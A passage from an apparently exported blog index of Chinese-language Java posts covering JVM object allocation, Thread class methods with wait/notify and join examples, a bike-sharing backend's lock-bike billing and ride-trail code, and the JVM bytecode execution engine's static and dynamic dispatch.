buffer），默认设定为占用Eden Space的1%。在Java程序中很多对象都是小对象且用过即丢，它们不存在线程共享也适合被快速GC，所以对于小对象通常JVM会优先分配在TLAB上，并且TLAB上的分配由于是线程私有所以没有锁开销。因此在实践中分配多个小对象的效率通常比分配一个大对象的效率要高。 三、栈上分配JVM在Server模式下的逃逸分析可以分析出某个对象是否永远只在某个方法、线程的范围内，并没有“逃逸”出这个范围，逃逸分析的一个结果就是对于某些未逃逸对象可以直接在栈上分配，由于该对象一定是局部的，所以栈上分配不会有问题。 四、对象非堆上分配的思想和启发对象不在堆上分配主要的原因还是堆是共享的，在堆上分配有锁的开销。无论是TLAB还是栈都是线程私有的，私有即避免了竞争（当然也可能产生额外的问题例如可见性问题），这是典型的用空间换效率的做法。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四、Thread类方法详解]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%9B%9B%E3%80%81Thread%E7%B1%BB%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[学习java线程的开发者,首先遇到的第一个类就是Thread,通过使用Thread类,我们就可以启动,停止,中断一个线程. 在同一个时间片里, 可能会有多个线程在执行, 每个线程都拥有它自己的方法调用堆栈, 参数和变量.每个app至少会有一个线程–主线程(main thread).下面主要来讲解各种方法的含义。 1. 线程等待与唤醒（wait()、notify()/notifyAll()）Object中有这么几个方法wait(long timeout), wait(long timeout, int nanos), wait(), notify(), notifyAll()。 1.1 wait()对象的wait方法有三个，一个是令对象等待任何线程来调用notify或者notifyAll方法来令该对象在当前线程唤醒。另外两个将当前线程置于等待状态，等到特定的时间来唤醒。 wait() 让当前线程处于“等待(阻塞)状态”，“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法”，当前线程被唤醒(进入“就绪状态”)。 wait(long timeout)让当前线程处于“等待(阻塞)状态”，“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或者超过指定的时间量”，当前线程被唤醒(进入“就绪状态”)。 wait(long timeout, int nanos)让当前线程处于“等待(阻塞)状态”，“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或者其他某个线程中断当前线程，或者已超过某个实际时间量”，当前线程被唤醒(进入“就绪状态”) 使用wait方法有个条件：当前线程必须持有对象的锁。执行wait后，当前线程会失去对象的锁，状态变为WAITING或者TIMED_WAITING状态。 1.2 notify()notify()可以随机唤醒正在等待的多个线程中的一个。被唤醒的线程并不能马上参与对锁的竞争，必须等调用notify的线程释放锁后才能参与对锁的竞争。而且被唤醒的线程在竞争锁时没有任何优势。 同wait方法一样，使用notify方法有个条件：线程必须持有对象的锁。 1.3 notifyAll()notifyAll()与notify()类似，区别是它可以唤醒在此对象监视器上等待的所有线程。 1.4 示例 先写一个messgae类： 123456789101112131415161718public class Message &#123; private String msg; public Message(String msg) &#123; this.msg = msg; &#125; public Message() &#123; &#125; public String getMsg() &#123; return msg; &#125; public void setMsg(String msg) &#123; this.msg = msg; &#125;&#125; waiter(): 123456789101112131415161718192021public class Waiter implements Runnable&#123; private Message msg; public Waiter(Message msg) &#123; this.msg = msg; &#125; @Override public void run() &#123; String name = Thread.currentThread().getName(); synchronized (msg)&#123;//不加会报java.lang.IllegalMonitorStateException try &#123; System.out.println(name+&quot;--等待&quot;+System.currentTimeMillis()); msg.wait(); System.out.println(name+msg.getMsg()+System.currentTimeMillis()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; notify(): 12345678910111213141516public class Notifier implements Runnable&#123; private Message msg; public Notifier(Message msg) &#123; this.msg = msg; &#125; @Override public void run() &#123; String name = Thread.currentThread().getName(); synchronized (msg)&#123; msg.setMsg(&quot;唤醒线程工作&quot;); msg.notify(); &#125; &#125;&#125; main(): 1234567891011121314public class Demo3 &#123; public static void main(String[] args) throws InterruptedException &#123; Message msg = new Message(&quot;锁&quot;); Waiter waiter = new Waiter(msg); new Thread(waiter,&quot;Waiter1&quot;).start();//waiter1 Waiter waiter1 = new Waiter(msg); new Thread(waiter1,&quot;Waiter2&quot;).start();//waiter2 Notifier notifier = new Notifier(msg); Thread.sleep(100); new Thread(notifier,&quot;Notify&quot;).start();//notify &#125;&#125; 运行结果： 123Waiter1--等待1511336556113Waiter2--等待1511336556113Waiter1唤醒线程工作1511336556213 分析：主函数启动两个waiter线程类，都以msg为锁，那么如果是notify()，只能唤醒其中的一个，另一个就会处于阻塞的状态。本程序，只唤醒了Waiter1，Waiter2一直处于阻塞的状态，程序停在waiter处，等待被唤醒。 如果是： 1msg.notifyAll(); 结果是： 1234Waiter1--等待1511336596131Waiter2--等待1511336596131Waiter2唤醒线程工作1511336596230Waiter1唤醒线程工作1511336596230 分析：这里用notifyAll，即唤醒所有，那么这两个wait都被唤醒而继续执行了。 2. 线程让步（yield()）API中对yield()的介绍是可以暂停当前正在执行的线程对象，并执行其他线程。“暂停”代表着让出CPU。执行yield()后，当前线程由运行状态变为就绪状态。但不能保证在当前线程调用yield()之后，其它具有相同优先级的线程就一定能获得执行权，也有可能是当前线程又进入到运行状态继续运行！ yield()与无参的wait()的区别： 执行yield()后，当前线程由运行状态变为就绪状态。执行wait后，当前线程会失去对象的锁，状态变为WAITING状态。 jdk 中的解释为： 调用该方法的线程通知线程调度器当前线程可以让出CPU，线程调度器可以响应或者忽略此请求。 要注意的是： 线程调度器并不一定响应这个请求。 响应请求时，仅仅将当前线程变为可运行状态。其他处于可运行状态的线程将竞争CPU资源，高优先级线程将会比相同优先级的线程有较高的概率获得CPU资源，但并不保证。 另外，需要注意的是，CPU资源和锁的获取并没有直接关系，CPU资源是由系统来分配的。 123456789@Overridepublic void run() &#123; for(int i=0; i&lt;num; i++)&#123; if (i==50)&#123; Thread.yield();//当i=50，将当前的线程执行权放弃，让cpu重新选择线程来执行，但不一定准确停住 &#125; System.out.println(i); &#125;&#125; 3. 线程休眠（sleep()）线程的休眠（暂停执行）与sleep(long millis)和sleep(long millis, int nanos)有关。API中的介绍是sleep(long millis) 方法可以在指定的毫秒数内让当前正在执行的线程休眠；sleep(long millis, int nanos) 可以在指定的毫秒数加指定的纳秒数内让当前正在执行的线程休眠。该线程不丢失任何监视器的所属权。简单来说就是sleep方法可以使正在执行的线程让出CPU，但不会释放锁。执行sleep方法后，当前线程由运行状态变为TIMED_WAITING状态。 sleep()与有参的wait()的区别是： 执行sleep()后，当前线程不会释放锁。执行有参的wait()后，当前线程会释放锁。 sleep()与yield()的区别是： 执行sleep后，当前线程状态变为TIMED_WAITING状态。执行yield()后，当前线程由运行状态变为WAITING状态。 123456789101112@Overridepublic void run() &#123; for(int i=0; i&lt;times; i++)&#123; try &#123; Thread.sleep(100); System.out.print(c+ " ");//每隔一百毫秒再来竞争cpu资源 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; System.out.println();&#125; 4. 线程启动（start()）见上一片文章，略。 5. 中断线程（interrupt())interrupt()常常被用来中断处于阻塞状态的线程。 interrupted()与isInterrupted()都可以测试当前线程是否已经中断。区别在于线程的中断状态由interrupted()清除。换句话说，如果连续两次调用interrupted()，则第二次调用将返回false。 在主线程中给要被打断的线程设置标志位，表示这个线程可以被打断： 1t1.interrupt(); 在t1线程中判断打断标志位是不是被设为true了，是的话break自己打断： 1234if(Thread.currentThread().isInterrupted())&#123; System.out.println("我停止了"); break;&#125; 所以线程的终止只能由自己决定，不能被其他的线程控制。 1Thread.interrupted();//返回当前线程的中断标志位，并且重置 6. 线程优先级每个线程都有一个优先级，高优先级线程的执行优先于低优先级线程。java 中的线程优先级的范围是1～10，默认的优先级是5。 setPriority(int newPriority)和getPriority()分别用来更改线程的优先级和返回线程的优先级。 7. 线程等待（join()）join()的作用是等待该线程终止，常常被用来让主线程在子线程运行结束之后才能继续运行。如在主线程main中调用了thread.join()，那么主线程会等待thread执行完后才继续执行。join(long millis)、join(long millis , int nanos)功能与join()类似，但限定了等待时间，join(long millis)意味着等待该线程终止的时间最长为millis毫秒，join(long millis , int nanos)意味着等待该线程终止的时间最长为millis毫秒 + nanos 纳秒，超时将主线程将继续执行。join()等价于join(0)，即超时为0，意味着要一直等下去。 定义一个打印字母的线程类： 1234567891011121314151617181920public class PrintChar implements Runnable&#123; private char c; private int times; public PrintChar() &#123; &#125; public PrintChar(char c, int times) &#123; this.c = c; this.times = times; &#125; @Override public void run() &#123; for(int i=0; i&lt;times; i++) &#123; System.out.print(c); &#125; System.out.println(); &#125;&#125; 在主函数中有一个循环打印数字的方法： 12345678910public class Demo1 &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new PrintChar('A',100)); t1.start(); for(int i=0; i&lt;50; i++) &#123; System.out.print(i); &#125; System.out.println(); &#125;&#125; 运行的效果是：主线程中的打印数字的方法一下全部执行掉，然后再执行打印字母的方法（大多数情况，也有可能是在一串数字之间夹杂着字母，存在一定的随机性）。 现在想：在主线程中插入该线程，使得该线程先执行，然后主线程再执行。 12345678910111213public class Demo1 &#123; public static void main(String[] args) throws InterruptedException &#123; Thread t1 = new Thread(new PrintChar('A',100)); t1.start(); for(int i=0; i&lt;50; i++) &#123; if(i==30)&#123; t1.join(); &#125; System.out.print(i); &#125; System.out.println(); &#125;&#125; 实际上，不一定每次都准确到30的时候就立即执行t1线程的，因为cpu执行的太快，不可能每次都很准确地停住。 从源码中可以了解到，join方法的实现依赖于wait方法，所以join方法会释放锁。 8. 守护线程Java中有两种线程：用户线程和守护线程。守护线程是一种特殊的线程，它的作用是为其他线程提供服务。例如GC线程就是守护线程。当正在运行的线程都是守护线程时，Java虚拟机退出，守护线程自动销毁。 setDaemon(boolean on)用于将该线程标记为守护线程或用户线程。该方法必须在启动线程前调用。isDaemon()用于测试该线程是否为守护线程。 setDaemon(true)必须在调用线程的start（）方法之前设置，否则会跑出IllegalThreadStateException异常。]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十四、锁车]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E5%9B%9B%E3%80%81%E9%94%81%E8%BD%A6%2F</url>
    <content type="text"><![CDATA[锁车 1、controller:123456789101112131415161718@RequestMapping("/lockBike")public ApiResult lockBike(@RequestBody BikeLocation bikeLocation)&#123; ApiResult&lt;List&lt;BikeLocation&gt;&gt; resp = new ApiResult&lt;&gt;(); try &#123; bikeService.lockBike(bikeLocation); resp.setMessage("锁车成功"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to lock bike", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 2、service:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@Overridepublic void lockBike(BikeLocation bikeLocation) throws BikeException&#123; try &#123; //结束订单，计算骑行时间 RideRecord record = rideRecordMapper.selectBikeRecordOnGoing(bikeLocation.getBikeNumber()); if(record==null)&#123; throw new BikeException("骑行记录不存在"); &#125; Long userid = record.getUserid(); //查询单车类型 查询计价信息 Bike bike = bikeMapper.selectByBikeNo(bikeLocation.getBikeNumber()); if(bike==null)&#123; throw new BikeException("单车不存在"); &#125; RideFee fee =feeMapper.selectBikeTypeFee(bike.getType()); if(fee==null)&#123; throw new BikeException("计费信息异常"); &#125; BigDecimal cost = BigDecimal.ZERO; record.setEndTime(new Date()); record.setStatus(RIDE_END); Long min = DateUtil.getBetweenMin(new Date(),record.getStartTime()); record.setRideTime(min.intValue()); int minUnit =fee.getMinUnit(); int intMin = min.intValue(); if(intMin/minUnit==0)&#123; //不足一个时间单位 按照一个时间单位算 cost = fee.getFee(); &#125;else if(intMin%minUnit==0)&#123; //整除了时间单位 直接计费 cost = fee.getFee().multiply(new BigDecimal(intMin/minUnit)); &#125;else if(intMin%minUnit!=0)&#123; //不整除 +1 补足一个时间单位 cost = fee.getFee().multiply(new BigDecimal((intMin/minUnit)+1)); &#125; record.setRideCost(cost); rideRecordMapper.updateByPrimaryKeySelective(record); //钱包扣费 Wallet wallet = walletMapper.selectByUserId(userid); wallet.setRemainSum(wallet.getRemainSum().subtract(cost)); walletMapper.updateByPrimaryKeySelective(wallet); //修改mongoDB中单车状态为锁定 Query query = Query.query(Criteria.where("bike_no").is(bikeLocation.getBikeNumber())); Update update = Update.update("status",BIKE_LOCK) .set("location.coordinates",bikeLocation.getCoordinates()); mongoTemplate.updateFirst(query,update,"bike-position"); &#125;catch (Exception e)&#123; log.error("fail to lock bike", e); throw new BikeException("锁定单车失败"); &#125;&#125; 3、需要一张新表用于确定计费1234567891011121314DROP TABLE IF EXISTS `ride_fee`;CREATE TABLE `ride_fee` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `min_unit` int(5) NOT NULL COMMENT '扣费时间单位（多少小时为基准）', `fee` decimal(10,2) NOT NULL COMMENT '每个时间单位产生多少费用', `bike_type` tinyint(4) NOT NULL COMMENT '单车类型', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;-- ------------------------------ Records of ride_fee-- ----------------------------INSERT INTO `ride_fee` VALUES ('1', '30', '1.00', '1');INSERT INTO `ride_fee` VALUES ('2', '30', '0.50', '2'); 4、测试12345678@Testpublic void locak() throws BikeException&#123; BikeLocation bikeLocation = new BikeLocation(); bikeLocation.setBikeNumber(28000003L); Double[] bikePosition = new Double[]&#123;118.776591,32.087816&#125;; bikeLocation.setCoordinates(bikePosition); bikeService.lockBike(bikeLocation);&#125;]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十五、骑行轨迹]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%BA%94%E3%80%81%E9%AA%91%E8%A1%8C%E8%BD%A8%E8%BF%B9%2F</url>
    <content type="text"><![CDATA[骑行轨迹 1、需要定时上报骑行轨迹轨迹： contrller中： 123456789101112131415161718@RequestMapping("/reportLocation")public ApiResult reportLocation(@RequestBody BikeLocation bikeLocation)&#123; ApiResult&lt;List&lt;BikeLocation&gt;&gt; resp = new ApiResult&lt;&gt;(); try &#123; bikeService.reportLocation(bikeLocation); resp.setMessage("上报坐标成功"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to report location", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 对于service: 12345678910111213141516171819202122232425public void reportLocation(BikeLocation bikeLocation) throws BikeException&#123; //数据库中查询该单车尚未完结的订单 RideRecord record = rideRecordMapper.selectBikeRecordOnGoing(bikeLocation.getBikeNumber()); if(record==null)&#123; throw new BikeException("骑行记录不存在"); &#125; // 查询mongo中是否已经有骑行的坐标记录数据 DBObject obj = mongoTemplate.getCollection("ride_contrail") .findOne(new BasicDBObject("record_no",record.getRecordNo())); //没有 插入 //已经存在 添加坐标 if(obj==null)&#123; List&lt;BasicDBObject&gt; list = new ArrayList(); BasicDBObject temp = new BasicDBObject("loc",bikeLocation.getCoordinates()); list.add(temp); BasicDBObject insertObj = new BasicDBObject("record_no",record.getRecordNo()) .append("bike_no",record.getBikeNo()) .append("contrail",list); mongoTemplate.insert(insertObj,"ride_contrail"); &#125;else &#123; Query query = new Query( Criteria.where("record_no").is(record.getRecordNo())); Update update = new Update().push("contrail", new BasicDBObject("loc",bikeLocation.getCoordinates())); mongoTemplate.updateFirst(query,update,"ride_contrail"); &#125;&#125; 进行测试： 12345678@Testpublic void trail() throws BikeException &#123; BikeLocation bikeLocation = new BikeLocation(); bikeLocation.setBikeNumber(28000003L); Double[] bikePosition = new Double[]&#123;118.776591,33.087816&#125;; bikeLocation.setCoordinates(bikePosition); bikeService.reportLocation(bikeLocation);&#125; mongodb新建集合叫ride_contrail.由于是第一次插值，什么都没有。后面再插入，就在估计的数组中继续追加数据。 2、返回骑行记录： 12345678910111213141516171819@RequestMapping("/list/&#123;id&#125;")public ApiResult&lt;List&lt;RideRecord&gt;&gt; listRideRecord(@PathVariable("id") Long lastId)&#123; ApiResult&lt;List&lt;RideRecord&gt;&gt; resp = new ApiResult&lt;&gt;(); try &#123; UserElement ue = getCurrentUser(); List&lt;RideRecord&gt; list = rideRecordService.listRideRecord(ue.getUserId(),lastId); resp.setData(list); resp.setMessage("查询成功"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to query ride record ", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; sql： 12345678&lt;select id="selectRideRecordPage" resultMap="BaseResultMap" &gt;select&lt;include refid="Base_Column_List" /&gt;from ride_recordwhere userid = #&#123;userId&#125;AND id&gt; #&#123;lastId&#125;AND status = 2&lt;/select&gt; 3、根据订单号获取对应的骑行记录： 1234567891011121314151617181920@RequestMapping("/contrail/&#123;recordNo&#125;")public ApiResult&lt;RideContrail&gt; rideContrail(@PathVariable("recordNo") String recordNo)&#123; ApiResult&lt;RideContrail&gt; resp = new ApiResult&lt;&gt;(); try &#123; UserElement ue = getCurrentUser(); RideContrail contrail = bikeGeoService.rideContrail("ride_contrail",recordNo); resp.setData(contrail); resp.setMessage("查询成功"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to query ride record ", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 12345678910111213141516171819202122public RideContrail rideContrail(String collection, String recordNo) throws BikeException&#123; try &#123; DBObject obj = mongoTemplate.getCollection(collection).findOne(new BasicDBObject("record_no", recordNo)); RideContrail rideContrail = new RideContrail(); rideContrail.setRideRecordNo((String) obj.get("record_no")); rideContrail.setBikeNo(((Integer) obj.get("bike_no")).longValue()); BasicDBList locList = (BasicDBList) obj.get("contrail"); List&lt;Point&gt; pointList = new ArrayList&lt;&gt;(); for (Object object : locList) &#123; BasicDBList locObj = (BasicDBList) ((BasicDBObject) object).get("loc"); Double[] temp = new Double[2]; locObj.toArray(temp); Point point = new Point(temp); pointList.add(point); &#125; rideContrail.setContrail(pointList); return rideContrail; &#125; catch (Exception e) &#123; log.error("fail to query ride contrail", e); throw new BikeException("查询单车轨迹失败"); &#125;&#125; 这样就完成了对应骑行的记录封装，对应的RideContrail为： 12345678@Datapublic class RideContrail &#123; private String rideRecordNo; private Long bikeNo; private List&lt;Point&gt; contrail;&#125;]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十二、虚拟机字节码执行引擎]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%BA%8C%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[本章讲解虚拟机字节码执行引擎。 我们都知道，在当前的Java中（1.0）之后，编译器讲源代码转成字节码，那么字节码如何被执行的呢？这就涉及到了JVM的字节码执行引擎，执行引擎负责具体的代码调用及执行过程。就目前而言，所有的执行引擎的基本一致： 输入：字节码文件 处理：字节码解析 输出：执行结果 物理机的执行引擎是由硬件实现的，和物理机的执行过程不同的是虚拟机的执行引擎由于自己实现的。 1. 运行时候的栈结构每一个线程都有一个栈,也就是前文中提到的虚拟机栈，栈中的基本元素我们称之为栈帧。 栈帧是用于支持虚拟机进行方法调用和方法执行的数据结构。 每个栈帧都包括了一下几部分：局部变量表、操作数栈、动态连接、方法的返回地址 和一些额外的附加信息。 栈帧中需要多大的局部变量表和多深的操作数栈在编译代码的过程中已经完全确定，并写入到方法表的Code属性中。 在活动的线程中，位于当前栈顶的栈帧才是有效的，称之为当前帧，与这个栈帧相关联的方法称为当前方法。 执行引擎运行的所有字节码指令只针对当前栈帧进行操作。 需要注意的是一个栈中能容纳的栈帧是受限，过深的方法调用可能会导致StackOverFlowError，当然，我们可以认为设置栈的大小。其模型示意图大体如下： 1.1 局部变量表是变量值的存储空间，由方法参数和方法内部定义的局部变量组成，其容量用Slot作为最小单位。 在编译期间，就在方法的Code属性的max_locals数据项中确定了该方法所需要分配的局部变量表的最大容量。 由于局部变量表是建立在线程的栈上，是线程的私有数据，因此不存在数据安全问题。 在方法执行时，虚拟机通过使用局部变量表完成参数值到参数变量列表的传递过程。 如果是实例方法，那局部变量表第0位索引的Slot存储的是方法所属对象实例的引用，因此在方法内可以通过关键字this来访问到这个隐含的参数。其余的参数按照参数表顺序排列，参数表分配完毕之后，再根据方法体内定义的变量的顺序和作用域分配。 我们知道类变量表有两次初始化的机会，第一次是在“准备阶段”，执行系统初始化，对类变量设置零值，另一次则是在“初始化”阶段，赋予程序员在代码中定义的初始值。和类变量初始化不同的是，局部变量表不存在系统初始化的过程，这意味着一旦定义了局部变量则必须人为的初始化，否则无法使用。举例说明： 123456789101112131415public void test()&#123; call(2,3); ... call2(2,3);&#125;public void call(int i,int j)&#123; int b=2; ...&#125;public static void call2(int i,int j)&#123; int b=2; ...&#125; 这时call()所对应的栈帧中的局部变量表大体如下： 而call2()所对应的栈帧的局部变量表大体如下： 另外，在概念模型中，两个栈帧作为虚拟机栈的元素，相互之间是完全独立的，但是大多数虚拟机的实现里都会作一些优化处理，令两个栈帧出现一部分重叠。让下栈帧的部分操作数栈与上面栈帧的部分局部变量表重叠在一起，这样在进行方法调用返回时就可以共用一部分数据，而无须进行额外的参数复制传递了，重叠过程如下图： 1.2 操作数栈后入先出栈，由字节码指令往栈中存数据和取数据，栈中的任何一个元素都是可以任意的Java数据类型。 和局部变量类似，操作数栈的最大深度也在编译的时候写入到Code属性的max_stacks数据项中。 当一个方法刚开始执行的时候，这个方法的操作数栈是空的，在方法的执行过程中，会有各种字节码指令往操作数栈中写入和提取内容，也就是出栈/入栈操作。 操作数栈中元素的数据类型必须与字节码指令的序列严格匹配，这由编译器在编译器期间进行验证，同时在类加载过程中的类检验阶段的数据流分析阶段要再次验证。 另外我们说Java虚拟机的解释引擎是基于栈的执行引擎，其中的栈指的就是操作数栈。 1.3 动态连接每个栈帧都包含一个指向运行时常量池中该栈帧所属方法的引用，持有该引用是为了支持方法调用过程中的动态连接。 1.4 方法返回地址存放调用该方法的pc计数器的值。 当一个方法开始之后，只有两种方式可以退出这个方法： 1、执行引擎遇到任意一个方法返回的字节码指令，也就是所谓的正常完成出口。 2、在方法执行的过程中遇到了异常，并且这个异常没有在方法内进行处理， 也就是只要在本方法的异常表中没有搜索到匹配的异常处理器，就会导致方法退出，这种方式成为异常完成出口。 正常完成出口和异常完成出口的区别在于：通过异常完成出口退出的不会给他的上层调用者产生任何的返回值。 无论通过哪种方式退出，在方法退出后都返回到该方法被调用的位置，方法正常退出时，调用者的pc计数器的值作为返回地址，而通过异常退出的，返回地址是要通过异常处理器表来确定，栈帧中一般不会保存这部分信息。本质上，方法的退出就是当前栈帧出栈的过程。 2. 方法调用方法调用的主要任务就是确定被调用方法的版本（即调用哪一个方法），该过程不涉及方法具体的运行过程。按照调用方式共分为两类： 解析调用是静态的过程，在编译期间就完全确定目标方法。 分派调用即可能是静态，也可能是动态的，根据分派标准可以分为单分派和多分派。两两组合有形成了静态单分派、静态多分派、动态单分派、动态多分派 2.1 解析在Class文件中，所有方法调用中的目标方法都是常量池中的符号引用，在类加载的解析阶段，会将一部分符号引用转为直接引用，也就是在编译阶段就能够确定唯一的目标方法，这类方法的调用成为解析调用。 此类方法主要包括静态方法和私有方法两大类，前者与类型直接关联，后者在外部不可访问，因此决定了他们都不可能通过继承或者别的方式重写该方法，符合这两类的方法主要有以下几种：静态方法、私有方法、实例构造器、父类方法。虚拟机中提供了以下几条方法调用指令： invokestatic：调用静态方法，解析阶段确定唯一方法版本 invokespecial：调用方法、私有及父类方法，解析阶段确定唯一方法版本 invokevirtual：调用所有虚方法 invokeinterface：调用接口方法 invokedynamic：动态解析出需要调用的方法，然后执行 前四条指令固化在虚拟机内部，方法的调用执行不可认为干预，而invokedynamic指令则支持由用户确定方法版本。其中invokestatic指令和invokespecial指令调用的方法称为非虚方法，其余的（final修饰的除外[^footnote4]）称为虚方法。 2.2 分派分派调用更多的体现在多态上。 静态分派：所有依赖静态类型来定位方法执行版本的分派成为静态分派，发生在编译阶段，典型应用是方法重载。 动态分派：在运行期间根据实际类型来确定方法执行版本的分派成为动态分派，发生在程序运行期间，典型的应用是方法的重写。 单分派：根据一个宗量对目标方法进行选择。 多分派：根据多于一个宗量对目标方法进行选择。 静态分派 12345678910111213141516171819202122232425262728293031public class StaticDispatch &#123; static abstract class Human &#123; &#125; static class Man extends Human &#123; &#125; static class Woman extends Human &#123; &#125; public void sayHello(Human guy) &#123; System.out.println("hello guy..."); &#125; public void sayHello(Man man) &#123; System.out.println("hello man..."); &#125; public void sayHello(Woman woman) &#123; System.out.println("hello woman..."); &#125; public static void main(String[] args) &#123; Human man = new Man(); Human woman = new Woman(); StaticDispatch sd = new StaticDispatch(); sd.sayHello(man); sd.sayHello((Man)man); sd.sayHello(woman); sd.sayHello((Woman)woman); &#125; &#125; 输出结果： 1234hello guy...hello man...hello guy...hello woman... 分析： 但为什么会选择执行参数为Human的重载呢？在这之前，先按如下代码定义两个重要的概念：Human man = new Man(); 上面代码中的“Human”称为变量的静态类型(Static Type)或者外观类型(Apparent Type)，后面的“Man”则称为变量的实际类型(Actual Type)，静态类型和实际类型在程序中都可以发生一些变化，区别是静态类型的变化仅仅在使用时发生，变量本身的静态类型不会被改变，并且最终的静态类型是编译期可知的；而实际类型变化的结果在运行期才可确定，编译期在编译程序的时候并不知道一个对象的实际类型是什么。 123456//实际类型变化 Human man = new Man(); man = new Woman(); //静态类型变化 sd.sayHello((Man)man); sd.sayHello((Woman)man); 即： 1234567891011public static void main(String[] args) &#123; Human man = new Man(); Human woman = new Woman(); StaticDispatch sd = new StaticDispatch(); sd.sayHello(man); //man sd.sayHello((Woman)woman); //woman man = new Woman();//实际类型发生变化 //sd.sayHello((Man)man);报错 ：Woman cannot be cast to chapter12.StaticDispatch$Man sd.sayHello((Woman)man); //woman&#125; main()里面的两次sayHello()方法调用，在方法接收者已经确定是对象“sr”的前提下，使用哪个重载版本，就完全取决于传入参数和数据类型。代码中刻意定义了两个静态类型相同，实际类型不同的变量，但虚拟机(准确地说是编译器)在重载时是通过参数的静态类型而不是实际类型作为判定依据的。并且静态类型在编译期是可知的，所以在编译阶段，Javac编译器就根据参数的静态类型决定使用哪个重载版本，所以选择了sayHello(Human)作为调用目标，并把这个方法的符号引用写到main()方法的两条invokevirual指令的参数中。 所有依赖静态类型来定位方法执行版本的分派动作，都称为静态分派。静态分派的最典型应用就是方法重载。静态分派发生在编译阶段，因此确定静态分派的动力实际上不是由虚拟机来执行的。另外，编译器虽然能确定出方法的重载版本，但是很多情况下，这个重载版本并不是“唯一的”，往往只能确定一个“更适合的”版本。这种模糊的结论在0和1构成的计算机世界中算是个比较“稀罕”的事件，产生这种模糊结论的主要原因是字面量不需要定义，所以字面量没有显式的静态类型，它的静态类型只能通过语言上的规则去理解和推断。 动态分派 动态分派与重写(Override)有着很密切的关联。如下代码： 12345678910111213141516171819202122232425262728package com.xtayfjpk.jvm.chapter8; public class DynamicDispatch &#123; static abstract class Human &#123; protected abstract void sayHello(); &#125; static class Man extends Human &#123; @Override protected void sayHello() &#123; System.out.println("man say hello"); &#125; &#125; static class Woman extends Human &#123; @Override protected void sayHello() &#123; System.out.println("woman say hello"); &#125; &#125; public static void main(String[] args) &#123; Human man = new Man(); Human woman = new Woman(); man.sayHello(); woman.sayHello(); man = new Woman(); man.sayHello(); &#125; &#125; 这里显示不可能是根据静态类型来决定的，因为静态类型都是Human的两个变量man和woman在调用sayHello()方法时执行了不同的行为，并且变量man在两次调用中执行了不同的方法。导致这个现象的原是是这两个变量的实际类型不同。那么Java虚拟机是如何根据实际类型来分派方法执行版本的呢，我们使用javap命令输出这段代码的字节码，结果如下： 1234567891011121314151617181920212223public static void main(java.lang.String[]); flags: ACC_PUBLIC, ACC_STATIC Code: stack=2, locals=3, args_size=1 0: new #16 // class com/xtayfjpk/jvm/chapter8/DynamicDispatch$Man 3: dup 4: invokespecial #18 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Man."&lt;init&gt;":()V 7: astore_1 8: new #19 // class com/xtayfjpk/jvm/chapter8/DynamicDispatch$Woman 11: dup 12: invokespecial #21 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Woman."&lt;init&gt;":()V 15: astore_2 16: aload_1 17: invokevirtual #22 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Human.sayHello:()V 20: aload_2 21: invokevirtual #22 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Human.sayHello:()V 24: new #19 // class com/xtayfjpk/jvm/chapter8/DynamicDispatch$Woman 27: dup 28: invokespecial #21 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Woman."&lt;init&gt;":()V 31: astore_1 32: aload_1 33: invokevirtual #22 // Method com/xtayfjpk/jvm/chapter8/DynamicDispatch$Human.sayHello:()V 36: return 0-15行的字节码是准备动作，作用是建立man和woman的内存空间，调用Man和Woman类的实例构造器，将这两个实例的引用存放在第1和第2个局部变量表Slot之中，这个动作对应了代码中这两句： 12Human man = new Man(); Human woman = new Woman(); 接下来的第16-21行是关键部分，第16和第20两行分别把刚刚创建的两个对象的引用压到栈顶，这两个对象是将执行的sayHello()方法的所有者，称为接收者(Receiver)。 